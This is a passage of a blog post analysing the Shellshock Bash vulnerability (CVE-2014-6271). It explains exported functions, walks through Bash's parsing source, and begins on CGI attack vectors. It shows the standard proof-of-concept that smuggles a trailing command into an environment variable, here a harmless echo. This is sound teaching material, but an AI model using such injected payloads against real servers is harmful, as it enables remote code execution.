<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=application-name content><meta name=apple-mobile-web-app-status-bar-style content="#fff"><meta name=apple-mobile-web-app-title content><title>CVE-2014-6271 - Shellshock -
</title><link rel=alternate href=https://h4r1337.github.io/posts/shellshock/ hreflang=en><link rel=canonical href=https://h4r1337.github.io/posts/shellshock/><link rel=prev href=https://h4r1337.github.io/posts/tfcctf-25/><meta name=description content="Shellshock affects Bash versions 1.03 through 4.3, discovered in 2014 by security researcher Stéphane Chazelas. It allows attackers to execute code remotely on affected systems. The flaw itself stems from Bash’s incorrect parsing of environment variables: an attacker can supply a malformed function as an environment variable, which Bash then executes when it loads that variable. A system is exploitable if an attacker can control the value of an environment variable that then gets passed to a Bash shell. Although there are many ways to exploit it, the most common attack vector is through CGI-based web servers. Due to its severity and the widespread use of CGI-based web servers at the time, it was widely exploited by attackers, leading to comparisons with the infamous Heartbleed vulnerability. "><meta name=keywords content="CVE-2014-6271,Bash Shellshock,Shellshock vulnerability,GNU Bash exploit,Bash remote code execution,Shellshock root cause analysis,Shellshock exploit example,Bash environment variable exploit,Shellshock CGI Apache,Shellshock CGI attack,Shellshock SSH ForceCommand,Shellshock DHCP exploit,Shellshock OpenVPN vulnerability,Shellshock mitigation,Shellshock patch,Bash function export vulnerability,Stephane Chazelas Shellshock,Bash 1.03 through 4.3 vulnerability,Shellshock attack vectors,Shellshock proof of concept,env command vulnerability,export bash functions security,Apache CGI Shellshock exploit,Shellshock SSH AcceptEnv,Shellshock privilege escalation,Bash parsing bug,Shellshock in the wild,Shellshock vs Heartbleed,LangSec Shellshock analysis,language theoretic security,Shellshock fuzzing vulnerabilities,Shellshock RedHat patch,Florian Weimer Shellshock patch,Bash function namespace BASH_FUNC,CVE-2014-6271 patch details"><meta property="og:url" content="https://h4r1337.github.io/posts/shellshock/"><meta property="og:site_name" content="h4r1337 blog | CTF writeups"><meta property="og:title" content="CVE-2014-6271 - Shellshock"><meta property="og:description" content="Shellshock affects Bash versions 1.03 through 4.3, discovered in 2014 by security researcher Stéphane Chazelas. It allows attackers to execute code remotely on affected systems. The flaw itself stems from Bash’s incorrect parsing of environment variables: an attacker can supply a malformed function as an environment variable, which Bash then executes when it loads that variable. A system is exploitable if an attacker can control the value of an environment variable that then gets passed to a Bash shell. Although there are many ways to exploit it, the most common attack vector is through CGI-based web servers. Due to its severity and the widespread use of CGI-based web servers at the time, it was widely exploited by attackers, leading to comparisons with the infamous Heartbleed vulnerability. "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-22T09:50:50+05:30"><meta property="article:modified_time" content="2025-09-22T09:50:50+05:30"><meta property="article:tag" content="CVE-2014-6271"><meta property="article:tag" content="Shellshock"><meta property="article:tag" content="Bash"><meta property="article:tag" content="Bash Vulnerability"><meta property="article:tag" content="RCE"><meta property="article:tag" content="CGI"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2014-6271 - Shellshock"><meta name=twitter:description content="Shellshock affects Bash versions 1.03 through 4.3, discovered in 2014 by security researcher Stéphane Chazelas. It allows attackers to execute code remotely on affected systems. The flaw itself stems from Bash’s incorrect parsing of environment variables: an attacker can supply a malformed function as an environment variable, which Bash then executes when it loads that variable. A system is exploitable if an attacker can control the value of an environment variable that then gets passed to a Bash shell. Although there are many ways to exploit it, the most common attack vector is through CGI-based web servers. Due to its severity and the widespread use of CGI-based web servers at the time, it was widely exploited by attackers, leading to comparisons with the infamous Heartbleed vulnerability. "><meta name=referrer content="no-referrer-when-downgrade"><link rel=apple-touch-icon sizes=180x180 href=/favicons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicons/favicon-16x16.png><link rel=manifest href=/favicons/site.webmanifest><link rel=mask-icon href=/favicons/safari-pinned-tab.svg color=#5bbad5><meta name=apple-mobile-web-app-title content="Jekyll Klise"><meta name=application-name content="Jekyll Klise"><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#2c2c2c"><link href=https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css rel=stylesheet><link rel=stylesheet href=/sass/main.min.2480d733c3cd78de5d135eb2d8c0b0f964b2bf1e047d180f4f363bdcc3b23b20.css integrity="sha256-JIDXM8PNeN5dE16y2MCw+WSyvx4EfRgPTzY73MOyOyA="><link rel=stylesheet href=/lib/fontawesome-free/all.min.e5e202e3c899507992952533f57b634722b69b34241d271963559d31aa33ef81.css integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E="></head><body data-theme=dark class=notransition><script>const body=document.body,data=body.getAttribute("data-theme"),initTheme=e=>{e==="dark"?body.setAttribute("data-theme","dark"):e==="light"?body.removeAttribute("data-theme"):localStorage.setItem("theme",data)};initTheme(localStorage.getItem("theme")),setTimeout(()=>body.classList.remove("notransition"),75)</script><script id=partial/analytics.html data-goatcounter=https://h4r1337-blog.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class=navbar role=navigation><nav class=menu><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg width="24" height="24" viewBox="0 0 512 512"><path d="M64 384H448V341.33H64zm0-106.67H448V234.67H64zM64 128v42.67H448V128z"/></svg>
</span></label><a id=mode href=#><svg class="mode-sunny" width="24" height="24" viewBox="0 0 512 512"><title>LIGHT</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg><svg class="mode-moon" width="24" height="24" viewBox="0 0 512 512"><title>DARK</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg></a><div class=trigger><div class=trigger-container><a class=menu-link href=/ title=home>home
</a><a class=menu-link href=/posts title=posts>posts
</a><a class=menu-link href=/series title=series>series
</a><a class=menu-link href=/resume.pdf title=resume>resume
</a><a class=menu-link href=/whoami title=whoami>whoami
</a><a class="menu-link rss" href=/index.xml><svg width="17" height="17" viewBox="0 0 512 512" fill="#ed812e"><title>RSS</title><path d="M108.56 342.78a60.34 60.34.0 1060.56 60.44 60.63 60.63.0 00-60.56-60.44z"/><path d="M48 186.67v86.55c52 0 101.94 15.39 138.67 52.11s52 86.56 52 138.67h86.66c0-151.56-125.66-277.33-277.33-277.33z"/><path d="M48 48v86.56c185.25.0 329.22 144.08 329.22 329.44H464C464 234.66 277.67 48 48 48z"/></svg></a></div></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article itemscope itemtype=https://schema.org/BlogPosting><header class=header><div class=tags><span itemprop=keywords><a href=https://h4r1337.github.io/tags/cve-2014-6271/ class=tag>CVE-2014-6271</a>
,
<a href=https://h4r1337.github.io/tags/shellshock/ class=tag>SHELLSHOCK</a>
,
<a href=https://h4r1337.github.io/tags/bash/ class=tag>BASH</a>
,
<a href=https://h4r1337.github.io/tags/bash-vulnerability/ class=tag>BASH VULNERABILITY</a>
,
<a href=https://h4r1337.github.io/tags/rce/ class=tag>RCE</a>
,
<a href=https://h4r1337.github.io/tags/cgi/ class=tag>CGI</a>
,
<a href=https://h4r1337.github.io/tags/apache/ class=tag>APACHE</a>
,
<a href=https://h4r1337.github.io/tags/ssh-forcecommand/ class=tag>SSH FORCECOMMAND</a>
,
<a href=https://h4r1337.github.io/tags/patch-analysis/ class=tag>PATCH-ANALYSIS</a>
,
<a href=https://h4r1337.github.io/tags/mitigation/ class=tag>MITIGATION</a>
,
<a href=https://h4r1337.github.io/tags/code-review/ class=tag>CODE REVIEW</a>
,
<a href=https://h4r1337.github.io/tags/bash_func/ class=tag>BASH_FUNC</a>
,
<a href=https://h4r1337.github.io/tags/langsec/ class=tag>LANGSEC</a></span></div><h1 class=header-title itemprop=headline>CVE-2014-6271 - Shellshock</h1><div class=post-meta><time datetime="2025-09-22 09:50:50 +0530 +0530" itemprop=datePublished>2025-09-22
</time><span itemprop=author itemscope itemtype=https://schema.org/Person><span itemprop=name>h4r1337</span>
</span><time hidden datetime="2025-09-22 09:50:50 +0530 +0530" itemprop=dateModified></time>
<span hidden itemprop=publisher itemtype=Person>h4r1337</span>
<span hidden itemprop=mainEntityOfPage>Shellshock affects Bash versions 1.03 through 4.3, discovered in 2014 by security researcher Stéphane Chazelas. It allows attackers to execute code remotely on affected systems. The flaw itself stems from Bash’s incorrect parsing of environment variables: an attacker can supply a malformed function as an environment variable, which Bash then executes when it loads that variable. A system is exploitable if an attacker can control the value of an environment variable that then gets passed to a Bash shell. Although there are many ways to exploit it, the most common attack vector is through CGI-based web servers. Due to its severity and the widespread use of CGI-based web servers at the time, it was widely exploited by attackers, leading to comparisons with the infamous Heartbleed vulnerability.</span></div></header><div class=page-content itemprop=articleBody><p>This is the first post in my CVE Analysis blog series. Since this is the first post in this series and I have no prior experience with CVE analysis, I will be writing about Shellshock. This is an old vulnerability in Bash, and there are already many articles and blogs written about it. Therefore, this is not something you would want to read if you are already familiar with this vulnerability, as no novel techniques or previously unknown facts are discussed here. Rather, this is just my attempt to establish a format for writing future posts. And after weeks <del>months</del> of procrastination, I finally finished it. With that disclaimer in place, let&rsquo;s get started.</p><hr><h2 id=summary><a href=#summary class=anchor-head aria-label=Anchor></a>Summary</h2><table><thead><tr><th style=text-align:left><strong>CVE</strong></th><th style=text-align:left>CVE-2014-6271</th></tr></thead><tbody><tr><td style=text-align:left><strong>Disclosure Date</strong></td><td style=text-align:left>12 September 2014</td></tr><tr><td style=text-align:left><strong>Patch Date</strong></td><td style=text-align:left>24 September 2014</td></tr><tr><td style=text-align:left><strong>Product</strong></td><td style=text-align:left>Bash</td></tr><tr><td style=text-align:left><strong>Advisory</strong></td><td style=text-align:left><a href=https://nvd.nist.gov/vuln/detail/CVE-2014-6271>https://nvd.nist.gov/vuln/detail/CVE-2014-6271</a></td></tr><tr><td style=text-align:left><strong>Affected Versions</strong></td><td style=text-align:left>1.03 - 4.3</td></tr><tr><td style=text-align:left><strong>First Patched Version</strong></td><td style=text-align:left>4.3-025</td></tr><tr><td style=text-align:left><strong>Issue/Bug Report</strong></td><td style=text-align:left><a href=https://seclists.org/oss-sec/2014/q3/650>https://seclists.org/oss-sec/2014/q3/650</a></td></tr><tr><td style=text-align:left><strong>Reporter(s)</strong></td><td style=text-align:left>Stephane Chazeles</td></tr></tbody></table><blockquote><p>GNU Bash versions 1.03 through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka &ldquo;ShellShock.&rdquo;</p></blockquote><hr><h2 id=exploitation><a href=#exploitation class=anchor-head aria-label=Anchor></a>Exploitation</h2><p>A quick Google search on how to test if your Bash version is vulnerable to Shellshock will show you a proof of concept like this</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>env x<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style=color:#b8bb26>&#39;echo test&#39;</span>
</span></span></code></pre></div><p>Let&rsquo;s check one by one what this command means.</p><h3 id=environment-variables><a href=#environment-variables class=anchor-head aria-label=Anchor></a>Environment Variables</h3><p>First we have to understand what an environment variable is.
An environment variable is a dynamic, named value maintained by the operating system; it is not a feature specific to any shell or to Linux itself. It can be used by other processes to obtain various configurations. For example, in Linux the <code>$HOME</code> environment variable is used to store the location of the home directory of the current user. Bash is simply another process that can read or modify its own environment variables.
In Bash we can set our own custom environment using the built-in <code>export</code> command:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fabd2f>export</span> foo<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;hello world&#39;</span>
</span></span></code></pre></div><p>Now any child processes spawned by the current Bash instance can access the environment variable named <code>foo</code>. This variable can be referenced by adding a <code>$</code> at the start of the variable name:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#fabd2f>echo</span> $foo
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># hello world</span>
</span></span></code></pre></div><p>We can also set an environment variable for a single program without exporting it:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>foo<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;hello world&#39;</span> program
</span></span></code></pre></div><p>This will spawn the child process <code>program</code> with the environment variable <code>foo</code> in it.
Now you may notice that in the above Shellshock payload they are using the <code>env</code> command to set the environment variable. The <code>env</code> command is a standalone utility designed to manage the environment with more control when launching a process:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#928374;font-style:italic># To start the program in a sandboxed environment with no environment variables</span>
</span></span><span style=display:flex><span>env -i program  
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># To start the program with the FOO environment variable</span>
</span></span><span style=display:flex><span>env FOO<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;test&#39;</span> program
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># To remove the FOO variable from the environment before running program</span>
</span></span><span style=display:flex><span>env -u FOO program
</span></span></code></pre></div><h3 id=function-as-environment-variables><a href=#function-as-environment-variables class=anchor-head aria-label=Anchor></a>Function as Environment Variables</h3><p>So far, we have learned about how to export normal static values as environment variables. In Bash, we can also export shell functions into the environment—a Bash extension that isn&rsquo;t part of the POSIX standard. These exported functions are only passed to child Bash processes; other programs or non-Bash shells will ignore them. There are several ways to define these variables, including using the <code>export</code> command with the <code>-f</code> flag to say that the given name refers to a Bash function.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hello<span style=color:#fe8019>()</span> <span style=color:#fe8019>{</span> <span style=color:#fabd2f>echo</span> <span style=color:#b8bb26>&#34;Hello, World&#34;</span>; <span style=color:#fe8019>}</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>export</span> -f hello
</span></span><span style=display:flex><span>bash -c <span style=color:#b8bb26>&#39;hello&#39;</span> <span style=color:#928374;font-style:italic># This will start a new child bash proccess and call the exported hello function</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Hello, World</span>
</span></span></code></pre></div><p>Using the <code>env</code> command:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>env hello<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;() { echo &#34;Hello, World&#34;; }&#39;</span> bash -c <span style=color:#b8bb26>&#39;hello&#39;</span>
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Hello, World</span>
</span></span></code></pre></div><p>Or we can simply follow the same <code>FOO='value' program</code> format, without any additional utility program, which will also work:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hello<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;() { echo &#34;Hello, World&#34;; }&#39;</span> bash -c hello
</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Hello, World</span>
</span></span></code></pre></div><div class="alert alert-note collapsed"><div class=alert-heading-box onclick=toggleAlert(this)><i class="bx bx-info-circle"></i><p class=alert-heading>Note</p><i class='bx bx-chevron-down collapsed'></i></div><div class=alert-content style=display:none><p>Exporting shell functions like this only work in Bash before Shellshock.
In modern Bash only the <code>export -f</code> method will work.</p></div></div><script>function toggleAlert(e){var t=e.parentElement,s=t.querySelector(".alert-content"),n=e.querySelectorAll("i")[1];t.classList.toggle("open"),t.classList.toggle("collapsed"),t.classList.contains("open")?(s.style.display="block",n.classList.remove("open"),n.classList.add("collapsed")):(n.classList.remove("collapsed"),n.classList.add("open"),s.style.display="none")}</script><h3 id=the-payload><a href=#the-payload class=anchor-head aria-label=Anchor></a>The payload</h3><p>Now that we have covered the essentials, let&rsquo;s walk through the payload step by step:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>env x<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style=color:#b8bb26>&#39;echo test&#39;</span>
</span></span></code></pre></div><p>In this command, we define a shell function in the environment variable <code>x</code> and pass it to a new Bash process. Here, <code>:</code> (colon) is a Bash built-in command that does nothing, so <code>x</code> is just an empty function. The crucial point—and the heart of the Shellshock vulnerability—is what comes after the function definition. We don&rsquo;t stop at the end of the function (<code>}</code>); we append a trailing <code>; echo vulnerable</code> to it. A vulnerable Bash program, when parsing its environment variables, doesn&rsquo;t stop at the function&rsquo;s closing brace—it continues past the semicolon and executes <code>echo vulnerable</code> as a separate command. The important thing is we don&rsquo;t have to call the function <code>x</code> to invoke this; the extra command runs automatically during parsing.</p><figure><img src=/img/shellshock/Pasted%20image%2020250613172338.webp></figure><p>In a vulnerable Bash version this command will print both &ldquo;vulnerable&rdquo; and &ldquo;test&rdquo;.</p><figure><img src=/img/shellshock/Pasted%20image%2020250613173028.webp></figure><h2 id=root-cause-analysis><a href=#root-cause-analysis class=anchor-head aria-label=Anchor></a>Root Cause Analysis</h2><p>Now let&rsquo;s take a look at the <a href="https://cgit.git.savannah.gnu.org/cgit/bash.git/tree/?h=bash-4.3-alpha">Bash source code</a> to see where the vulnerability exists. We will look specifically at the code that is responsible for parsing environment variables. The main function inside the <code>shell.c</code> file calls <code>shell_initialize()</code>:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#fe8019>static</span> <span style=color:#fabd2f>void</span> <span style=color:#fabd2f>shell_initialize</span> () {
</span></span><span style=display:flex><span>[...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#928374;font-style:italic>/* Initialize internal and environment variables.  Don&#39;t import shell
</span></span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>     functions from the environment if we are running in privileged or
</span></span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>     restricted mode or if the shell is running setuid. */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8ec07c>#if defined (RESTRICTED_SHELL)
</span></span></span><span style=display:flex><span><span style=color:#8ec07c></span>  <span style=color:#fabd2f>initialize_shell_variables</span> (shell_environment, privileged_mode<span style=color:#fe8019>||</span><span style=color:#fe8019>restricted</span><span style=color:#fe8019>||</span>running_setuid);
</span></span><span style=display:flex><span><span style=color:#8ec07c>#else
</span></span></span><span style=display:flex><span><span style=color:#8ec07c></span>  <span style=color:#fabd2f>initialize_shell_variables</span> (shell_environment, privileged_mode<span style=color:#fe8019>||</span>running_setuid);
</span></span><span style=display:flex><span><span style=color:#8ec07c>#endif
</span></span></span><span style=display:flex><span><span style=color:#8ec07c></span>
</span></span><span style=display:flex><span>[...]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>shell_environment</code> variable contains the environment variables, and it is passed to another function called <code>initialize_shell_variables(env, privmod)</code>. <code>privmod</code> tells if Bash is currently running in privileged mode, using the <code>-p</code> flag. This will come later when we discuss the different ways that were used to fix Shellshock. This function is defined inside the <code>variable.c</code> file:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#928374;font-style:italic>/* Initialize the shell variables from the current environment.
</span></span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>   If PRIVMODE is nonzero, don&#39;t import functions from ENV or
</span></span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>   parse $SHELLOPTS. */</span>
</span></span><span style=display:flex><span><span style=color:#fabd2f>void</span> <span style=color:#fabd2f>initialize_shell_variables</span> (env, privmode)
</span></span><span style=display:flex><span>     <span style=color:#fabd2f>char</span> <span style=color:#fe8019>**</span>env;
</span></span><span style=display:flex><span>     <span style=color:#fabd2f>int</span> privmode;
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>[...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fe8019>for</span> (string_index <span style=color:#fe8019>=</span> <span style=color:#d3869b>0</span>; string <span style=color:#fe8019>=</span> env[string_index<span style=color:#fe8019>++</span>]; )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#928374;font-style:italic>/* If exported function, define it now.  Don&#39;t import functions from
</span></span></span><span style=display:flex><span><span style=color:#928374;font-style:italic>	 the environment in privileged mode. */</span>
</span></span><span style=display:flex><span>    <span style=color:#fe8019>if</span> (privmode <span style=color:#fe8019>==</span> <span style=color:#d3869b>0</span> <span style=color:#fe8019>&amp;&amp;</span> read_but_dont_execute <span style=color:#fe8019>==</span> <span style=color:#d3869b>0</span> <span style=color:#fe8019>&amp;&amp;</span> 
</span></span><span style=display:flex><span>	    <span style=color:#fabd2f>STREQN</span> (<span style=color:#b8bb26>&#34;() {&#34;</span>, string, <span style=color:#d3869b>4</span>)) {
</span></span><span style=display:flex><span>		[...]
</span></span><span style=display:flex><span>		<span style=color:#928374;font-style:italic>// This is where shellshock happens
</span></span></span><span style=display:flex><span><span style=color:#928374;font-style:italic></span>		<span style=color:#fabd2f>parse_and_execute</span> (temp_string, name, SEVAL_NONINT<span style=color:#fe8019>|</span>SEVAL_NOHIST);
</span></span><span style=display:flex><span>		[...]
</span></span><span style=display:flex><span>	}
</span></span></code></pre></div><p>After some string manipulation the environment variables are passed to the <code>parse_and_execute()</code> function. For example, if the environment variable contains a value like:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-env data-lang=env><span style=display:flex><span>FOO<span style=color:#fe8019>=()</span> <span style=color:#fe8019>{</span> <span style=color:#fabd2f>echo</span> hi; <span style=color:#fe8019>}</span>
</span></span></code></pre></div><p>Then it will be converted to <code>FOO () { echo hi; }</code>; and this will be stored in <code>temp_string</code> and will be passed to the <code>parse_and_execute()</code> function for execution. Here, the only check done to differentiate an exported function from an exported variable is whether its value starts with <code>() {</code>.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#fabd2f>int</span> <span style=color:#fabd2f>parse_and_execute</span> (string, from_file, flags)
</span></span><span style=display:flex><span>     <span style=color:#fabd2f>char</span> <span style=color:#fe8019>*</span>string;
</span></span><span style=display:flex><span>     <span style=color:#fe8019>const</span> <span style=color:#fabd2f>char</span> <span style=color:#fe8019>*</span>from_file;
</span></span><span style=display:flex><span>     <span style=color:#fabd2f>int</span> flags;
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  [...]
</span></span><span style=display:flex><span>  <span style=color:#fabd2f>with_input_from_string</span> (string, from_file);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#fe8019>while</span> (<span style=color:#fe8019>*</span>(bash_input.location.string))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      [...]
</span></span><span style=display:flex><span>      <span style=color:#fe8019>if</span> (<span style=color:#fabd2f>parse_command</span> () <span style=color:#fe8019>==</span> <span style=color:#d3869b>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          [...]
</span></span><span style=display:flex><span>          last_result <span style=color:#fe8019>=</span> <span style=color:#fabd2f>execute_command_internal</span>
</span></span><span style=display:flex><span>                (command, <span style=color:#d3869b>0</span>, NO_PIPE, NO_PIPE, bitmap);
</span></span><span style=display:flex><span>          <span style=color:#fabd2f>dispose_command</span> (command);
</span></span><span style=display:flex><span>          [...]
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      <span style=color:#fe8019>else</span>
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          last_result <span style=color:#fe8019>=</span> EXECUTION_FAILURE;
</span></span><span style=display:flex><span>          <span style=color:#fe8019>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  [...]
</span></span><span style=display:flex><span>  <span style=color:#fe8019>return</span> (last_result);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The way they are trying to add this function to the environment variable is by directly executing it.
You can try this by just entering the string <code>FOO () { echo hi; }</code> into a Bash shell and calling <code>FOO</code>:</p><figure><img src=/img/shellshock/Pasted%20image%2020250825143248.webp></figure><p>This is similar to how Bash adds the function to its <em>function table</em>.
The above string containing the function definition is treated as an input to the parser, and if it parses successfully, it just executes it using the <code>execute_command_internal()</code> function without any further checks or sanitation. <code>parse_command()</code> doesn&rsquo;t stop after the function definition. If the string contains trailing commands after the function definition, it will happily parse the entire input, and it will be executed.</p><h2 id=attack-vectors><a href=#attack-vectors class=anchor-head aria-label=Anchor></a>Attack Vectors</h2><p>Now you might wonder how this specific parsing vulnerability in Bash could lead to widespread exploitation—and in most cases that would seem like a reasonable question. But the problem arises when other applications use Bash under the hood to deal with user inputs. We will talk about various such applications shortly.</p><p>For a system to be vulnerable to Shellshock, <a href=https://infosecnirvana.com/attack-vectors-used-shellshock/>3 conditions</a> must be met:</p><ol><li>The application must set an environment variable with attacker-controlled values.</li><li>It must invoke the Bash shell.</li><li>And most importantly, the system must be running on a vulnerable version of Bash.</li></ol><p>Shortly after the Shellshock vulnerability was found, people started to find more and more applications that came under these exploitable conditions.</p><h3 id=common-gateway-interface-cgi><a href=#common-gateway-interface-cgi class=anchor-head aria-label=Anchor></a>Common Gateway Interface (CGI)</h3><p>The major attack vector of this vulnerability is through CGI-based web servers, which at that time were popular and widely used.
CGI is an interface specification for interacting between HTTP requests and programs, which can range from compiled C binaries to Bash scripts. According to the <a href=https://www.rfc-editor.org/rfc/rfc3875>specification</a>, information from the server to the program is carried through something called a meta-variable. The most common implementation of these is through the system&rsquo;s environment variables. That is, information like HTTP headers, HTTP methods, and other user inputs via request parameters are passed to the program as system environment variables. Then the server starts a new child process of the program with the crafted environment variables. If the program invokes Bash (directly or indirectly), Bash will import and parse all environment variables, which in vulnerable versions could lead to command execution.
Web servers like Apache, Microsoft IIS, etc. have support for CGI scripting. We will take a look at Apache in this blog by setting up a Docker container with a vulnerable Bash version. You can check out the lab <a href=https://github.com/h4r1337/cve-labs/tree/main/CVE-2014-6271/cgi-docker>in my GitHub repo</a>.
